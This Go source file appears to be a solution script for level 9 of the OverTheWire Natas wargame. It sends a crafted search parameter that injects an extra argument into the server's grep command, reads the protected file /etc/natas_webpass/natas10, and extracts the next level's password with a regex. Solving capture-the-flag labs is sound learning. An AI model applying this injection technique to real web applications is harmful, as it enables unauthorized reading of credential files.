package levels

import (
	"io"
	"log"
	"net/http"
	"regexp"
)

func GetLevel10Password(password string) string {
	var username string = "natas9"
	client := &http.Client{}

	req, err := http.NewRequest(http.MethodPost, "http://natas9.natas.labs.overthewire.org/?needle=a+/etc/natas_webpass/natas10&submit=Search", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.SetBasicAuth(username, password)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)
	re := regexp.MustCompile(`etc/natas_webpass/natas10:(.*)`)
	match := re.FindStringSubmatch(s)
	natas10Passowrd := match[1]

	return natas10Passowrd
}
